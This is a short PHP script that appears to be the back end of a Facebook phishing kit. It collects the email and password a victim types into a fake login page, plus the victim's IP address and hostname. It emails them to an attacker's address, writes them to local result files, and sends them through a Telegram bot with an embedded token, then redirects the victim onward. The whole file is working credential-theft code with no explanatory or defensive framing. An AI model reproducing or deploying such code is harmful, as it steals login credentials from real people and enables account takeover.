<?php
$ip = getenv("REMOTE_ADDR");
$back = "loggin-error.html";
$hostname = gethostbyaddr($ip);
$message .= "------ LOG FB ------\n";
$message .= "ID : ".$_POST['email']."\n";
$message .= "PW : ".$_POST['pass']."\n";
$message .= "------- IP -------\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= " U7l             : $link\n";
$message .= "---------------\n";
$send = "Ossmane45@gmail.com";
$subject = "Facebook| $ip ";
$headers = "From:Trnswise <don@mox.fr>";
mail($send,$subject,$message,$headers);
 $Txt_Rezlt = fopen('../rzl00.txt', 'a+');
fwrite($Txt_Rezlt, $message);
fclose($Txt_Rezlt);

$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-662491150&text=" . urlencode($message)."" );
$file = fopen("../SE/ajz.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 

header("Location: info.html");

?>